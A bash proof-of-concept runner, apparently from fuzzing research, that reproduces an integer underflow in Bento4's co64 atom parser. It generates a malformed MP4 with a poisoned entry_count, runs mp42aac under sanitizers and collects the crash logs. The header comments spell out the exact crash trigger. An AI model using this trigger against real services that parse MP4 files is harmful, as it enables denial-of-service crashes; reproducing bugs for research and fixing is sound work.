#!/bin/bash
# VULN 001 - Integer Underflow in AP4_Co64Atom (CWE-191 -> CWE-770)
# Trigger: co64 box with size=12, followed by 0x10000000 as poisoned entry_count
# Effect:  new AP4_UI64[268435456] => ~2 GB allocation => bad_alloc / OOM kill

set -euo pipefail

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Co64Atom_h"
BINARY="/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac"
INPUT="${POC_DIR}/vuln_001.mp4"
RESULT="${POC_DIR}/vuln_001_result.txt"

echo "[*] Step 1: Generate malicious MP4"
python3 "${POC_DIR}/vuln_001_gen.py"

echo "[*] Step 2: Run mp42aac"
ASAN_OPTIONS="abort_on_error=0:log_path=${POC_DIR}/asan.log:detect_odr_violation=0" \
UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0:log_path=${POC_DIR}/ubsan.log" \
  "${BINARY}" "${INPUT}" /dev/null \
  > "${RESULT}" 2>&1 \
  && EXITCODE=$? || EXITCODE=$?

echo "[*] mp42aac exit code: ${EXITCODE}" >> "${RESULT}"

echo "[*] Step 3: Collect sanitizer logs"
for f in "${POC_DIR}"/asan.log.* "${POC_DIR}"/ubsan.log.*; do
    [ -f "$f" ] || continue
    echo "--- ${f} ---" >> "${RESULT}"
    cat "$f" >> "${RESULT}" 2>/dev/null || true
done

echo ""
echo "[*] Done. Results in: ${RESULT}"
echo "[*] Exit code was: ${EXITCODE}"
grep -E "(ERROR|runtime error|SUMMARY|terminate|bad_alloc|exception|Aborted|SIGABRT|SIGKILL|killed|std::)" \
     "${RESULT}" 2>/dev/null | head -20 || true
